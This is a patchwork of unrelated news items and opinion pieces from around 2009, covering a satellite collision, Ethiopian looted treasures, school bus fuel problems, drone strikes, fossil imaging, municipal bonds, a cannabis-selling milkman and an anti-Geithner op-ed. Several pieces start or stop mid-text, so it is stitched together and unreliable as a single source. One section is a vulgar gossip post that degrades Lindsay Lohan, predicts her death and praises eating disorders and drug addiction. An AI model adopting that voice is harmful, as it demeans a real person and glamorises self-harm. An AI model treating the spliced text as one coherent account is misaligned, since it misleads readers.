This , however , is not my concern .

Two satellites collide in orbit
BY WILLIAM HARWOOD
STORY WRITTEN FOR CBS NEWS " SPACE PLACE " & USED WITH PERMISSION
Posted : February 11 , 2009 ;
Updated @ 5 p.m. with Iridium statement ;
Updated @ 5:45 p.m. with STRATCOM interview
In an unprecedented space collision , a commercial Iridium communications satellite and a defunct Russian satellite ran into each other Tuesday above northern Siberia , creating a cloud of wreckage , officials said today .

The international space station does not appear to be threatened by the debris , they said , but it 's not yet clear whether it poses a risk to any other military or civilian satellites .
" They collided at an altitude of 790 kilometers ( 491 miles ) over northern Siberia Tuesday about noon Washington time , " said Nicholas Johnson , NASA 's chief scientist for orbital debris at the Johnson Space Center in Houston .
" The U.S. space surveillance network detected a large number of debris from both objects . "
Air Force Brig .
Gen. Michael Carey , deputy director of global operations with U.S. Strategic Command , the agency responsible for space surveillance , said initial radar tracking detected some 600 pieces of debris .
He identified the Russian spacecraft as Cosmos 2251 , a communications relay station launched in June 1993 , and said the satellite is believed to have been non-operational for the past 10 years or so .
" As of about 12 hours ago , I think the head count was up ( to around ) 600 pieces , " Carey told CBS News late today .
" It 's going to take about two days before we get a solid picture of what the debris fields look like .
But you , I think , can imply that the majority of that should be probably along the same line as the original orbits . "
He said U.S. STRATCOM routinely tracks about 18,000 objects in space , including satellites and debris , that are 3.9 inches across or larger .
Tracking priority and " conjunction analysis " - identifying which objects may pose a threat to manned spacecraft - is the first priority .
" It 's going to take a while " to get an accurate count of the debris fragments , Johnson said .
" It 's very , very difficult to discriminate all those objects when they 're really close together .
And so , over the next couple of days , we 'll have a much better understanding . "
Asked which satellite was at fault , Johnson said " they ran into each other .
Nothing has the right of way up there .
We do n't have an air traffic controller in space .
There is no universal way of knowing what 's coming in your direction . "
Iridium Satellite LLC operates a constellation of some 66 satellites , along with orbital spares , to support satellite telephone operations around the world .
The spacecraft , which weigh about 1,485 pounds when fully fueled , are in orbits tilted 86.4 degrees to the equator at an altitude of about 485 miles .
Ninety - five Iridium satellites were launched between 1997 and 2002 and several have failed over the years .
" Yesterday , Iridium Satellite LLC lost an operational satellite , " the company said in a statement .
" According to information shared with the company by various U.S. government organizations that monitor satellites and other space objects ( such as debris ) , it appears that the satellite loss is the result of a collision with a non-operational Russian satellite .
" Although this event has minimal impact on Iridium 's service , the company is taking immediate action to address the loss .
The Iridium constellation is healthy , and this event is not the result of a failure on the part of Iridium or its technology .
While this is an extremely unusual , very low - probability event , the Iridium constellation is uniquely designed to withstand such an event , and the company is taking the necessary steps to replace the lost satellite with one of its in - orbit spare satellites . "
Johnson said the collision was unprecedented .
" Nothing to this extent ( has happened before ) , " he said .
" We 've had three other accidental collisions between what we call catalog objects , but they were all much smaller than this and always a moderate sized objects and a very small object .
And these are two relatively big objects .
So this is a first , unfortunately . "
As for the threat posed by the debris , Johnson said NASA carried out an immediate analysis to determine whether the space station faced any increased risk .
The station , carrying three crew members , circles the globe at an altitude of about 220 miles in an orbit tilted 51.6 degrees to the equator .
" There are two issues : the immediate threat and a longer - term threat , " he said .
" It turns out , when you have a collision like this the debris is thrown very energetically both to higher orbits and to lower orbits .
So there are actually debris from this event which we believe are going through the space station 's altitude already .
Most of it is not , most of it is still clustered up where the event took place .
But a small number are going through station 's altitude .
" Yesterday , we did an assessment of what the risk might be to station and we found it 's going to be very , very small .
As time goes on , those debris will ( come down ) some over months , most over years and decades and as the big ones come down they 'll be tracked , we 'll see them and the worst - case scenario , we 'll just dodge them if we have to .
It 's the small things you can't see are the ones that can do you harm . "
Asked if other satellites might be at risk , Johnson said " technically , yes .
What we 're doing now is trying to quantify that risk .
That 's a work in progress .
It 's only been 24 hours .
We put first things first , which is station and preparing for the next shuttle mission . "
Most , if not all , of the debris is expected to eventually burn up in Earth 's atmosphere .
Ethiopia is demanding that Britain 's museums return some of its most significant religious treasures .
President Girma Wolde - Giorgis has personally intervened in a dispute to get the artefacts , including the Ethiopian royal crown , returned home 140 years after they were " looted " by marauding British troops .
The President has written to the British Museum , the Victoria & Albert Museum , the British Library and Cambridge University Library seeking the restitution of more than 400 so - called " treasures of Magdala " , which were stolen by British soldiers following a battle in 1868 .
In the letter , obtained by The Independent on Sunday , the President wrote : " I must state that Ethiopians have long grieved at the loss of this part of their national heritage .
Ethiopians feel that this act of appropriation had no justification in international law .
I feel , therefore , that the time has come for the return of Ethiopia 's looted treasures . "
Download the new Independent Premium app Sharing the full story , not just the headlines
Among the items being held in the UK is an 18 - carat gold crown and more than 300 priceless manuscripts , including Christian scriptures .
Experts say the issue is particularly sensitive for Ethiopians because many of the artefacts hold deep religious significance for them .
These include nine tabots , or sacred wooden altar slabs , which are recognised as so holy that the British Museum has pledged never to display them .
When a tabot was returned in 2005 after being discovered in the back of an Edinburgh church , thousands of people turned out to greet its return in Addis Ababa .
The objects were among those seized by British soldiers after the storming of the Fortress of Magdala in 1868 , a punitive expedition that followed the kidnap of several Britons .
Emperor Tewodros committed suicide after the battle .
According to contemporary accounts , British soldiers slaughtered hundreds of poorly armed Ethiopians after the battle , and then " jostled each other " to grab a piece of the emperor 's blood - stained shirt , which they tore from his body .
They also looted the citadel and a nearby church , carrying off treasures that included " an infinite variety of gold , and silver and brass crosses " , as well as " heaps of parchment royally illuminated " .
British museums have in the past resisted calls for artefacts from their collections to be returned to their countries of origin , but it is understood that Neil MacGregor of the British Museum and Mark Jones of the V&A have already met the Ethiopian ambassador to discuss the matter .
Museums often argue in restitution cases that the artefacts are better off in Britain because anyone in the world can view them , and the V&A is known to have asked Addis Ababa whether the silver crown of Emperor Tewodros , which it returned to Ethiopia in 1925 , is available for public view .
The V&A said yesterday that discussions were still ongoing , even though the President 's letter was sent in February this year .
The four organisations involved have also held meetings over the way forward .
The Magdala treasure differs to other restitution cases , such as that of the Elgin Marbles , because it is acknowledged that the treasures were simply stolen .
" It was straightforward looting , " a spokeswoman at the Ethiopian embassy in London said .
A spokeswoman for Afromet , an organisation that has campaigned for the restitutions of the items , said : " These museums hold most of Ethiopia 's heritage .
It means far more to Ethiopians than it could ever do to anyone else . "

Biodiesel fuel woes close Bloomington schools
“ All schools in the Bloomington School District ( Minnesota ) will be closed today after state - required biodiesel fuel clogged in school buses Thursday morning and left dozens of students stranded in frigid weather , the district said late Thursday .
Rick Kaufman , the district ’s spokesman , said elements in the biodiesel fuel that turn into a gel - like substance at temperatures below 10 degrees clogged about a dozen district buses Thursday morning .
Some buses were n’t able to operate at all and others experienced problems while picking up students , he said .
We had students at bus stops longer than we think is acceptable , and that ’s too dangerous in these types of temperatures , ” Kaufman said . ”
. . .
The decision to close school today came after district officials consulted with several neighboring districts that were experiencing similar problems .
Bloomington staffers tried to get a waiver to bypass the state requirement and use pure diesel fuel , but they were n’t able to do so in enough time , Kaufman said .
They also decided against scheduling a two - hour delay because the temperatures were n’t expected to rise enough that the problem would be eliminated .
In 2005 , a new requirement went into effect that all diesel fuel sold in Minnesota had to contain 2 percent biodiesel .
Kaufman said that some school districts keep their buses in temperature - controlled garages , and that the First Student bus service , which contracts with several metro- area school districts , keeps its buses in garages or idles them through the night .

LONDON , England ( CNN ) -- Britain's Prince Harry has been sent on course on equality and diversity after a series of high profile racial gaffes have damaged the young royal 's reputation , it was reported Thursday .
Prince Harry 's behavior landed him on the front pages of British newspapers .
Harry , an officer in the British Army , was formally disciplined by superiors after videos surfaced showing him using offensive language -- referring to a fellow soldier as a " Paki " and another as looking " like a raghead . "
Now , according to the Daily Mirror newspaper , the 24 - year - old has been ordered to attend lessons on how not to be racist and gain understanding of how offensive his comments are .
A spokesman for the prince told CNN : " Prince Harry has apologized for his comments and has been subjected to normal Army disciplinary procedures .
The matter is now closed . "
The latest development follows a new claim that the prince , third in line to throne , told a black British comedian that he did n't " sound like a black chap . "
In a 2005 gaffe , Harry apologized after he was photographed wearing a Nazi uniform at a party .

Mr Chick was arrested as soon as he came down
David Chick , 37 , of Burgess Hill , West Sussex , was charged with the offence at an east London police station on Wednesday night .
Mr Chick had staged the protest to highlight the plight of fathers who are refused access to their children .
He has been remanded in custody overnight to appear at Thames Magistrates Court on Thursday morning .
Mr Chick was arrested by awaiting officers after he came down from the 100 foot crane near Tower Bridge at 1600 GMT on Wednesday .
Police negotiators had feared for Mr Chick 's safety on the crane and made several attempts to talk him down .
Roads surrounding the London landmark were closed for the first five days of the protest amid fears the crane would become unstable in strong winds .
If we can charge David Blaine , we can charge him as well
Richard Barnes , deputy chairman of the MPA
Pressure group Fathers 4 Justice said Mr Chick was protesting after being refused the right to see his four - year - old daughter .
It is believed he was awarded a court order to see the child but had been refused access by the child 's mother over the last eight months .
Awareness raised
Matt O'Connor , spokesman for Fathers 4 Justice , said although Mr Chick was not a member of the organisation , he had done much to raise the plight of fathers who do not have access to their children .
He said : " Everyone 's talking about it in London .
MPs were talking about it in Parliament .
" We 're pleased we helped to bring the protest to an end . "

Descent into Chaos : The United States and the Failure of Nation Building in Pakistan , Afghanistan , and Central Asia by Ahmed Rashid Viking , 484 pp. , $ 27.95
Lahore , Pakistan
The relative calm in Iraq in recent months , combined with the drama of the US elections , has managed to distract attention from the catastrophe that is rapidly overwhelming Western interests in the part of the world that always should have been the focus of America ’s response to September 11 : the al - Qaeda and Taliban heartlands on either side of the border of Afghanistan and Pakistan .
The situation here could hardly be more grim .
The Taliban have reorganized , advanced out of their borderland safe havens , and are now massing at the gates of Kabul , threatening to surround and throttle the capital , much as the US - backed Mujahideen once did to the Soviet - installed regime in the late Eighties .
Like the rerun of an old movie , all journeys out of the Afghan capital are once again confined to tanks , armored cars , and helicopters .
Members of the Taliban already control over 70 percent of the country , up from just over 50 percent in November 2007 , where they collect taxes , enforce Sharia law , and dispense their usual rough justice ; but they do succeed , to some extent , in containing the wave of crime and corruption that has marked Hamid Karzai ’s rule .
This has become one of the principal reasons for their growing popularity , and every month their sphere of influence increases .
The blowback from the Afghan conflict in Pakistan is more serious still .
In less than eight months , Asif Ali Zardari ’s new government has effectively lost control of much of the North - West Frontier Province ( NWFP ) to the Taliban ’s Pakistani counterparts , a loose confederation of nationalists , Islamists , and angry Pashtun tribesmen under the nominal command of Baitullah Mehsud .
Few had very high expectations of Zardari , the notoriously corrupt playboy widower of Benazir Bhutto .
Nevertheless , the speed of the collapse that has taken place under his watch has amazed almost all observers .
Across much of the North - West Frontier Province — around a fifth of Pakistan — women have now been forced to wear the burqa , music has been silenced , barbershops are forbidden to shave beards , and over 140 girls ’ schools have been blown up or burned down .
In the provincial capital of Peshawar , a significant proportion of the city ’s elite , along with its musicians , have now decamped to the relatively safe and tolerant confines of Lahore and Karachi .
Meanwhile tens of thousands of ordinary people from the surrounding hills of the semiautonomous tribal belt — the Federally Administered Tribal Areas ( FATA ) that run along the Afghan border — have fled from the conflict zones blasted by missiles from unmanned American Predator drones and strafed by Pakistani helicopter gunships to the tent camps now ringing Peshawar .
( See the map . )

The tribal areas have never been fully under the control of any Pakistani government , and have always been unruly , but they have now been radicalized as never before .
The rain of armaments from US drones and Pakistani ground forces , which have caused extensive civilian casualties , daily add a …
About 150 million years ago , an evolutionarily hybrid creature , a dinosaur on its way to becoming a bird , died in what is now Germany , and become fossilized in limestone .
About 150 years ago , the fossil of this " dinobird " was discovered and celebrated as proof of Charles Darwin 's new theory of evolution .
Now fast word to a few weeks ago :
The famous fossil , the Thermopolis specimen of Archaeopteryx lithographica , made its way by truck from the Wyoming Dinosaur Center to the Stanford Synchrotron Radiation Lightsource in California , where it was meticulously scanned by one of the world 's most powerful X - ray machines , a building - sized device created for physics research .
By looking for traces of specific elements left in the slab of limestone as the bird decomposed , the researchers hope to uncover heretofore - unseen details of the soft tissue that once surrounded the well - preserved bones .
The X -rays , generated by SSRL 's high - speed electrons as they race around a 260 - foot - diameter ring , cause the elements to glow , revealing the ghost of soft tissue or feathers .
" If you want to find a single fossil which is a missing link in the evolution of dinosaurs into birds , this is it , " said University of Manchester paleontologist Phil Manning , a member of the research team .
" It 's a bird with sharp teeth , claws and a long bony tail .
If you were to freeze - frame evolution , you would end up with Archaeopteryx . "
" What you normally can't see are the chemical elements from the original organism that might still be present in the fossil , " said SSRL scientist Uwe Bergmann .
" Using X - ray fluorescence imaging , we can bring these elements to light , getting a better look at the fossil and learning more about the original animal . "

" These X - rays work a thousand time better than what you could do with a commercial X - ray machine .
Only a synchrotron can do this , " Bergmann said .
SSRL is part of SLAC National Accelerator Laboratory , which is operated by Stanford University for the Department of Energy .
In addition to offering a new view of a long - extinct animal , this work may also reveal more about fossilization itself .
By understanding how fossilization occurs and what exactly is preserved in the process , researchers will be able to deduce much more about ancient organisms and evolution .
The Archaeopteryx fossil holds a unique place in history .
It was brought to London soon after Darwin published his stunning On the Origin of Species in 1859 .
With perfect timing , the old bones played a major roll in the controversy Darwin had stirred up .
" This fossil was the savior of Darwin , " Manning said .
" As soon as it arrived in London , all of Darwin 's supporters realized that this was an intermediate animal , an evolutionary freak that they needed to study .
It was half way between dinosaur and bird .
This is the single most important fossil in paleontology for that simple reason .
" It was used to beat the living daylights out of the nonsense which had been put forward as to the reason for why animals were present on this planet .
Here , Darwin's theory of descendant with modification was hammered home with this one example of transitionary form , of an animal between dinosaur and bird . "
The fossil research is one example of how the SSRL is shining new light on fields as diverse as paleontology , medicine , and the history of mathematics .
The SSRL 's hair - thin X - ray beam has been used , for example , to make visible the hidden writing in a medieval copy of a mathematical treatise from the Greek mathematician Archimedes .
Tuned to specific energies , the X - rays produced images of phosphorus and calcium from the ink used on the papyrus document , which had been covered with paint .
Earlier this year , at the request of Stanford library officials and an academic researcher , the laser - like X - ray beam was used to scan a score by the Italian composer Luigi Cherubini ( 1760 – 1842 ) .
Portions of the work had been covered over with carbon - black ink , but after the scan , " The researcher was able to look right through the ink and read the score , " said Mary Miller , a Stanford preservation librarian .
" I think he was thrilled . "
" This is the very infancy of this new scientific method , " said paleontologist Peter Larson of the Black Hills Institute in South Dakota .
" We do n't even know enough about this to know the right questions to ask yet .
All of a sudden , we can look at fossils in a very different and new way . "
WASHINGTON 
With two missile strikes over the past week , the Obama administration has expanded the covert war run by the Central Intelligence Agency inside Pakistan , attacking a militant network seeking to topple the Pakistani government .
The missile strikes on training camps run by Baitullah Mehsud represent a broadening of the American campaign inside Pakistan , which has been largely carried out by drone aircraft .
Under President Bush , the United States frequently attacked militants from Al Qaeda and the Taliban involved in cross - border attacks into Afghanistan , but had stopped short of raids aimed at Mr. Mehsud and his followers , who have played less of a direct role in attacks on American troops .
The strikes are another sign that President Obama is continuing , and in some cases extending , Bush administration policy in using American spy agencies against terrorism suspects in Pakistan , as he had promised to do during his presidential campaign .
At the same time , Mr. Obama has begun to scale back some of the Bush policies on the detention and interrogation of terrorism suspects , which he has criticized as counterproductive .
Mr. Mehsud was identified early last year by both American and Pakistani officials as the man who had orchestrated the assassination of Benazir Bhutto , the former prime minister and the wife of Pakistan ’s current president , Asif Ali Zardari .
Mr. Bush included Mr. Mehsud ’s name in a classified list of militant leaders whom the C.I.A. and American commandos were authorized to capture or kill .
This is one of the coolest demonstrations ever : NASA 's new Common Extensible Cryogenic Engine for the lunar lander gets icicles on its rim while burning at 5,000 degrees Fahrenheit .
How is this feat possible ?
The CECE - developed by Pratt & Whitney Rocketdyne and NASA - is fueled by liquid oxygen and liquid hydrogen .
All the engine components are super - cooled , so when vapor comes out of the burning of the oxygen and the hydrogen and touches the rim of the cryogenic engine , it transforms into ice instantly .

The engine architecture allows it to smoothly throttle from top power levels - it was tested up to 108 percent - down to very - low power : 8 percent , which apparently is a new record in these kind of engines .
Its performance allows it to smoothly land on the Moon while carrying a bigger load .

When President Obama was elected , the political tide began to lean in a direction that no longer favored the wealthy .
The emphasis moved award from President Bush ’s idea of an “ ownership society ” and moved toward benefiting the lower and middle class .
Whether one agrees with the president ’s politics or not , there are some new realities that investors will need to face in the coming years and adjust their portfolios accordingly .
Under a newly announced deficit reduction plan , the Obama administration is hoping to curb the annual budget deficit by “ winding down the Iraq war ” and by allowing some of President Bush ’s tax - cuts to expire .
Specifically , President Obama is hoping to repeal the dividends and capital gains lapse after the year 2010 for individuals who make more than $ 250,000 per year .
This means the top rate for income tax would increase to 39.6 % and the top rate for capital gains and dividends would rise to 20 % .
President Obama is also proposing that hedge funds and private equity partners be taxed at ordinary income rates rather than at capital gains rates .
How can investors adjust to these tax increases ?
Many are suggesting that tax - free municipal bonds are looking increasingly favorable to investors that make high - incomes .
A tax - free municipal bond fund is essentially a group of investors that get together to form a mutual fund and then invest only in government debt in the form of municipal bonds .
Essentially , they are loaning money to local , state , and federal governments and receiving their money back as interest .
Since the government wants to encourage people to loan money to the various levels of government , money earned on these types of investments are n’t taxable .
There are different types of municipal bond funds that are usually separate by the length of the investment .
Typically , there are short , intermediate , and long term municipal bond funds .
Short term investments are typically bonds that are from six months to one year and are considered very safe .
Long term municipal bonds can be over 5 years long and are considered a bit riskier , but also provide a higher interest rate in the long term .
How do municipal bonds compare to other investments ?
In the last year , they have performed spectacularly .
All of Vanguard ’s municipal bond funds have actually made money , where as the S&P 500 and the Dow Jones industrial Average are down over 40 % .
However , the last 12 months have been some of the most unusual in history .
Since 1977 , Vanguard ’s Long Term Tax Exempt Municipal Bond Fund has averaged 6.04 % .
If you are at the top 35 % tax bracket , this has a taxable equivalent yield of 9.3 % .
If the top tax bracket jumped up to 39 % , that would jump up to a taxable equivalent yield of 9.9 % .
Municipal bonds are n’t right for everyone , but if you ’re in the 28 % tax - bracket or above and need a relatively safe place to put your money , they ’re definitely worth checking out .
They ’re not without some risk , but they ’re a lot less turbulent than the stock market is currently .
To the casual observer , Robert Holding seemed a kindly milkman who was attentive to his elderly customers as he delivered their daily pints .
To the less casual observer – specifically , a surveillance team from Lancashire police – Holding , 72 , turned out to be a drug dealer who was supplying cannabis from his milk float to an elderly clientele .
His customers , who smoked the resin to relieve their aches and pains , would leave notes with their empty milk bottles to say how much of the drug they required .
His reputation as a drug dealer spread rapidly among 17 of his customers in Burnley , Lancashire .
When detectives searched Holding 's home last July they were astonished to find wraps of cannabis resin stashed among the eggs in his milk crates .
Today at Burnley crown court , Holding was given a 36 - week jail sentence suspended for a year after he admitted possessing and supplying the drug .
The prosecution said Holding would get through a 9 oz ( 255g ) bar of cannabis resin every three weeks in sales to his customers and would not make " a great deal of profit " .
Sarah Statham , prosecuting , said : " He said customers would leave notes saying , ' Can I have an ounce , or an eighth ? '
He only sold to existing customers who were old and had aches and pains . "
The court heard Holding immediately confessed to supplying drugs but did not believe he was doing anything wrong .
Judge Beverley Lunt said : " You purport to justify this by saying you are helping out elderly people with ailments . "
She said Holding was wrong in his belief that cannabis was not harmful and he was not a philanthropist , but a drug dealer .
Had he been a philanthropist , she said , he would have " given it away " .
However , she had taken into consideration that his wife is suffering from Alzheimer 's and in a care home , and might not recognise him if he was jailed .
Philip Holden , in mitigation , told the court : " From the outset there is a particularly peculiar set of circumstances , and it is a bizarre case . "
He said his client was acting in the misguided belief that he was providing a public service .
He suffered from depression and had been " extremely frank " to police .
Holding told the Guardian .
" I do n't think what I was doing was that wrong .
A couple of them have got MS and others have got arthritis .
I was just giving them something to help .
I have had letters of support from all over the country , including one from Scotland .
I have had a lot of trouble with the papers and all the lies that have been published . "
Holding said his oldest customer had been 92 but was " no longer with us " .
Although he is teetotal and does not smoke , he began dealing in cannabis after being horrified to hear how much one of his elderly customers was paying for the drug .
" She had arthritis and her husband had MS and was in a wheelchair , " he said .
" They wanted it for the pain relief but it was costing them a fortune .
I would sell them an eighth of an ounce for £ 4.10 . "
The street value is £ 9 .
" I had an old woman who I used to give a bit of cannabis to and she would put it under her tongue for the pain . "
He said he had never been tempted to try it .
Cannabis has been shown in studies to help ease pain from arthritis and other conditions but it was upgraded to class B last month after concerns by the government about mental health risks .
Acting on tip - offs from concerned residents , Lancashire police launched a discreet surveillance operation , tailing Holding as he completed his round in his milk float .
A subsequent search of his home yielded 167g of cannabis .
Local police beat manager John Fisher said : " This was a good example of community policing after we received information from local residents that he was up to no good .
" The cannabis was wrapped and ready to go for the next day 's delivery .
Whatever he delivered was left on the doorstep with the milk . "
He added : " However , there is a very serious side to this because at the end of the day he has broken the law supplying an illegal substance .
It is certainly unusual in somebody so old .
" He probably thinks he is doing a community service but he is blatantly breaking the law and has to be dealt with .
I would call him an eccentric . "
A neighbour of Holding 's said many residents were supportive of him .
" To be fair , he did know what he was doing was wrong but the people he supplied to all had medical problems , so it is said .
Although he acts it , at the end of the day he is not a stupid bloke and he must have realised what he was doing was wrong . "
The MS Society said it did not condone illegal drug use , although there are clinical trials under way about the benefits of cannabis .
The photographer ’s name is Hedi Slimane , I did n’t check out her site for her other work and I ’m not too well versed in fashion photographer so I am not too sure if this she ’s into doing concentration camp themed photoshoots or if taking pictures of dying patients in palliative care with Cancer or Aids , or even spending time on the streets with drug addicted heroin addicts sucking dick for their next fix , is her artistic vision , but I do know that Lohan , despite being topless looks like fucking shit .
She ’s the kind of skinny I do n’t like and I am pretty understanding and accepting when it comes to skinny .
I mean I ’ve always been a fan of eating disorders and drug addiction , but something about Lohan just looks fucking wrong .
I understand why she ’s crazy , why she ’s delusional , why she ’s gone out of her way to start beef with me , why she tells people I stalk her .
It ’s all because she ’s not eating much more than Ronson ’s pussy and a pile of heroin because I think this is much deeper an issue than just cocaine .
She is going to die soon .
I can tell .
It ’s all part of her Heath Ledger strategy to get recognized as an actress , because she ’s fucking crazy and hopes to be remembered because the world already forgets her and her great performances in movies like Herbie Fully Loaded .
Let ’s face it , she ’s a fucking joke and if you were her , you ’d be on drugs too .
Here are those pics .
That said , nice nipple .
On a side note – I love Twitter and sent this link , along with this message to Mike Lohan … .

HELSINKI , Feb 12 ( Reuters ) - Google GOOG.O is planning to build a data centre at the old paper mill premises in southeastern Finland that it bought on Thursday from Stora Enso STERV .HE for 40 million euros ( $ 51.71 million ) .
“ We are currently considering to build a data centre at this site , and , as with any sort of construction project , there are a number of contingencies to be resolved and plans to be put in place , ” said Google spokesman Kay Oberbeck .
( Reporting by Tarmo Virki )
The Obama administration promises us a program of forced lending by banks .
By this means , they intend to promote economic recovery .
Amazing as it seems , our major officials do not understand that forced lending by banks severely undermines an economy .
Subsidizing loans will destroy the market for bank credit .
Bank credit will no longer be allocated by rational means of comparing real costs to real benefits .
The results will be to harm many people and worsen the structure of the U.S. economy .
In his testimony of Jan. 21 , 2009 , before the U.S. Senate Committee on Finance , Timothy F. Geithner told us that the Obama administration intends to induce banks to make loans .
Such an assault on how credit is granted by banks will hobble the U.S. economy .
To understand how this will happen , we need first to see how the granting of credit works in a free market .
The usual practice in a free market is that bankers assess the making of loans using their internal methods of evaluations .
They collect information about the borrowers and what the borrowers intend to do with the credit that the bankers provide .
If a businessman wants to borrow , the banker assesses the business prospects .
The banker does not generally grant credit to just anyone .
Bankers do not want to make bad loans , as this jeopardizes their jobs and positions , their stock ownership in banks , and the survival of the bank .
Bankers ordinarily exercise prudence .
These statements may seem counter - factual given the lately departed boom .
But deterioration in credit standards is something induced by a central banking — fostered and government - encouraged boom .
It is not the norm .
When the banks have ready access to ample bank reserves provided by the central bank at low cost , and when the government evaluates bankers on the basis of the volume of their community loans , banks are induced to make substandard loans and loans at interest rates that do not reflect the true values of assets .
Rising prices in a central bank — induced boom induce banks to make loans based on speculation that these prices are permanent and / or will continue to rise .
None of this is what normally happens in a free market in which banks issue their own credits ( their own bank notes ) and must evaluate carefully those to whom they grant such credits .
In a real free - banking market , there is no generalized inflation .
Bank notes of individual banks may depreciate , but those banks are then driven out of business if they do not stop over - issuing credit .
Banking systems around the world are mixtures of free market elements with central bank and government - controlled elements .
An important free market element has historically been that each banker evaluates the granting of credit by his own means , in competition with other bankers doing the same .
Organizationally , the banks have been privately financed by stocks and bonds .
The bank managers historically have substantial ownership interests in the bank so as to align their interests with those of outside suppliers of equity capital .
The entire system is arranged so that the bankers allocate their credits in a rational way ; that is , they make a business loan only when they expect to earn a risk - adjusted return based on a careful and realistic assessment of the prospects of the business .
One must not be misled into thinking that the bank lending behavior displayed in the recent boom is the kind of behavior exhibited in a market that operates without a central bank and without government inducements to lend .
Excessive central bank credit leads directly to bankers making loans that ultimately turn out to be bad loans when the market prices established in the boom start to decline .
Bad loans mean that the economy is beset with bad investments by businesses that are receiving too liberal credits .
This amounts to subsidizing production in unproductive areas of the economy , which means capital is being diverted into projects whose costs exceed their benefits .
These mal - investments are not noticed until the boom fails .
When a business that should not be receiving credit receives credit , the business attracts labor and resources ( goods and services ) away from sound businesses .
The weak business temporarily employs people in work that ultimately does not produce what people want to buy .
The business cannot cover its costs .
It loses money .
It may fail .
It lays off employees .
Its buildings and machinery and inventory stand unused .
They may need to be altered to suit better purposes .
Much human effort and time go to waste when the bad business gets loans that it should not get .
Employees learn skills in this business that may not be useful elsewhere .
They may spend several years attempting to get ahead only to find that there is no future in that business .
Their lives are interrupted .
They have to seek work elsewhere .
In the meantime , they use up their savings .
They may have to go back to school or move in with relatives .
The costs of bad lending are very high .
Another cost is that bad loans made to unsound business ventures harm the sound businesses .
They face greater costs and competition from businesses that are subsidized .
This undermines their viability .
There are many , many negative effects of the mis-allocation of credit ; and I have not even mentioned the very bad effects that arise when people who are poor credit risks are granted credits to buy homes , autos , furnishings , and other goods .
Nor have I mentioned that taxpayers are often called upon to pick up the tab , or that business failures of subsidized businesses cause the government to interfere even more into the economy .
The fact that individual banks evaluate credits carefully in normal markets is one of the few things that stands in the way of the excessive central bank credit entirely disrupting the economy .
Imagine that the central bank were itself to create credit and grant loans to businesses and persons , or imagine that the government does this ( which it actually does in great volume ) .
Imagine that the banks were not in the middle , as they are today , allocating credit by rational criteria of cost and benefit .
When the government hands out money , it does not use rational criteria .
It plays favorites and showers money on its favorites , even if what they do with that money ends up causing a loss by incurring greater costs than its benefits .
The taxpayers foot the bills .
If the central bank grants credits directly to businesses or other parties and cuts out individual bankers or other lenders , we are very unlikely to see the same degree of care and prudence as are exercised by individual bankers .
The central bank , after all , can create far more credit unilaterally .
Now , in fact , the Bernanke central bank is already extending credits at a scale that is unprecedented .
Some of it is direct to businesses , in the form of commercial paper .
This is a most dangerous game .
The central bank is subsidizing business enterprises directly and probably without the care that individual banks would use .
The central bank is intent on reviving business .
Its political objectives and its ability to create credit are not the stuff of a free market .
Neither is its independence from stockholders and lenders ; Bernanke does not own stock in his bank .
These factors do not make for careful evaluation of credits and credit granted at full market rates of interest .
The Fed is thus busy building an unsound and subsidized economy that misallocates resources .
It is busy laying the groundwork for the kinds of personal heartaches described earlier that occur when subsidized businesses are created and kept alive .
This is not all .
The Fed has liberally supplied reserves to member banks in the attempt to induce them to make more loans .
They are doing so to some extent .
The growth of the money supply has picked up to a very high annual rate .
The authorities do not think it is high enough .
They want to see the official numbers show a rebound in gross national product ( GNP ) .
This rebound , when it arrives , whether weak or strong , will be misleading if it is being induced by bad loans .
Some Americans will be temporarily employed at work in business operations that eventually will falter or fail .
The GNP figures will hide the fact that the costs exceed the benefits of many operations .
The banks have a great amount of excess reserves at present that have been created by the central bank , the Fed .
The government wants the banks to make more loans based upon these excess reserves .
The government wants to set in motion yet another credit - induced boom .
It wants bankers to abandon prudent lending policies and make questionable loans , just as it encouraged them to do in the past .
The consequences are before us in the form of a severe recession or depression .
Yet the government wants to repeat this process on an even larger scale .
The end result of this folly can only be the devastation of the U.S. economy on an even larger scale .
Enter the U.S. government and Treasury department once again leading the foray into this folly .
Enter Obama and Geithner .
Geithner was asked " Should the U.S. include more stringent requirements that TARP funds be used to lend ? "
He responded as follows :
" The actions of the Senate last week to authorize additional resources under the Emergency Economic Stabilization
Act will enable us to take additional steps to reinforce recovery .
If confirmed , I will carry out the reforms that President Obama and I believe are needed in this program .
This program must promote the stability of the financial system and increase lending . "
Geithner thinks that the new TARP ( Troubled Asset Relief Program ) money will " reinforce recovery . "
This is totally false .
As argued above , loan subsidies in any form undermine the economy .
This is well known to all economists , and it has been well known for centuries .
However , Geithner and company are disregarding and ignoring those all - too - human costs that I outlined .
They have a theory that the benefits of what they are doing exceed certain costs , nonetheless .
That theory is stated in part here when Geithner says :
" The funds provided to AIG by the government were provided on the basis of a complicated set of judgments about the risks to broader financial stability posed by the rapid and disorderly failure of a firm of that size in a very fragile market environment . "
The benefit that he seeks is to preserve or save the existing constellation of financial firms .
He will save ( bail out ) a failing company ( AIG ) if , in his judgment and not the judgment of market participants , that failure will lead to costs being borne by other unnamed companies and financial market players as well as by the general public .
Those costs are in large respects losses .
This is what he means by " risks to broader financial stability . "
He asserts that he is helping us by saving AIG and other financial players from taking the losses that arise from their bad investments .
I think he believes this , for he adds :
" The actions taken with respect to Citigroup to date have been to stabilize and strengthen the firm in order to allow it to perform its vital role in providing credit to households and businesses … .
I can assure you that as Treasury Secretary , I would require that any future actions with respect to AIG , Citigroup or any other institution be subject to careful scrutiny regarding the amount of taxpayer money being put at risk by acting relative to the costs of not acting . "
Geithner does not believe that Americans can create a sound financial system without these subsidies .
He does not believe that Americans can themselves right the financial system .
He does not believe in free markets .
He believes in Timothy F. Geithner .
He will assess the costs and benefits .
He will scrutinize .
He will spend our money for us .
He will decide how to create a stable arrangement .
How will he do this ?
He intends to save us by taxing us and transferring the money to some of these financial players that he selects by his complex judgments .
He will keep alive institutions that have failed or are on the threshold of failure .
He will help us by subsidizing bad loans and undermining the economy .
He will also , by the way , protect and help his friends .
In the nineteenth century , the U.S. economy recovered quickly from a number of major financial episodes like the current one .
Timothy F. Geithner , Ben Bernanke and Henry Paulson , all of whom represent that cadre of persons who believe only in their own powers , were nowhere to be seen .
Major banks , brokers , and investment bankers failed .
The rot was cleaned out .
In some instances , financial figures started over again .
The profit motive quickly led to a restoration of credit and business .
Geithner ’s words and rationales are hokum , puffery , claptrap , and nonsense .
